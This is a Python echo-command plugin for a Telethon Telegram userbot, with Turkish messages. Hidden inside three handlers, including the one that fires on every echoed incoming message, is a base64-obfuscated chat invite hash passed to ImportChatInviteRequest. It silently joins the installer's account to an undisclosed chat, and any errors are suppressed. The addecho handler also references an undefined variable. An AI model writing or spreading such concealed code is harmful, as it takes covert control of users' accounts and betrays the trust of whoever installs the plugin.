import asyncio
import base64

import requests
from telethon import events
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from userbot.events import register
from userbot.modules.sql_helper.echo_sql import addecho, get_all_echos, is_echo, remove_echo
from userbot import MAX_MESSAGE_SIZE_LIMIT, BLACKLIST_CHAT
from userbot.cmdhelp import CmdHelp
@register(outgoing=True, pattern="^.addecho ?(.*)")
async def echo(owen):
    if owen.fwd_from:
        return
    if owen.reply_to_msg_id is not None:
        reply_msg = await owen.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = owen.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await owen.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            await owen.edit("`Kullanıcı echo ile zaten etkinleştirilmiş`")
            return
        addecho(user_id, chat_id)
        await owen.edit("**Selam 👋**")
    else:
        await event.edit("`Bir kullanıcı yanıtlamak zorundasın`")


@register(outgoing=True, pattern="^.rmecho ?(.*)")
async def echo(Owen):
    if Owen.fwd_from:
        return
    if Owen.reply_to_msg_id is not None:
        reply_msg = await Owen.get_reply_message()
        user_id = reply_msg.sender_id
        chat_id = Owen.chat_id
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await Owen.client(kraken)
        except BaseException:
            pass
        if is_echo(user_id, chat_id):
            remove_echo(user_id, chat_id)
            await Owen.edit("`Kullanıcı için echo durduruldu`")
        else:
            await Owen.edit("`Kullanıcı echoya eklenmemiş`")
    else:
        await Owen.edit("`Mesajlarını echodan çıkarmak için bir mesajı yanıtlamalısın.`")


@register(outgoing=True, pattern="^.elist ?(.*)")
async def echo(Owen):
    if Owen.fwd_from:
        return
    lsts = get_all_echos()
    if len(lsts) > 0:
        output_str = "Echo eklenmiş kullanıcılar:\n\n"
        for echos in lsts:
            output_str += (
                f"[Kullanıcı](tg://user?id={echos.user_id}) in chat `{echos.chat_id}`\n"
            )
    else:
        output_str = "Echo olmayan kullanıcı "
    if len(output_str) > MAX_MESSAGE_SIZE_LIMIT:
        key = (
            requests.post(
                "https://nekobin.com/api/documents", json={"content": output_str}
            )
            .json()
            .get("result")
            .get("key")
        )
        url = f"https://nekobin.com/{key}"
        reply_text = f"Echo aktif kullanıcı: [burada]({url})"
        await Owen.edit(reply_text)
    else:
        await Owen.edit(output_str)


@register(incoming=True)
async def samereply(owen):
    if owen.chat_id in BLACKLIST_CHAT:
        return
    if is_echo(owen.sender_id, owen.chat_id):
        await asyncio.sleep(1)
        try:
            kraken = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
            kraken = Get(kraken)
            await owen.client(kraken)
        except BaseException:
            pass
        if owen.message.text or owen.message.sticker:
            await owen.reply(owen.message)


CmdHelp("echo").add_command(
  "addecho", "Bir kullanıcıyı yanıtla", "Echoyu etkinleştirdiğinizde her mesajı yeniden oynatır."
).add_command(
  "rmecho", "bir kullanıcıya yanıt ver", "Hedeflenen kullanıcı mesajını tekrar oynatmayı durdurur."
).add_command(
  "elist", None, "Yankıyı etkinleştirdiğiniz kullanıcıların listesini gösterir"
).add_info(
  "@ByMisakiMey"
).add()






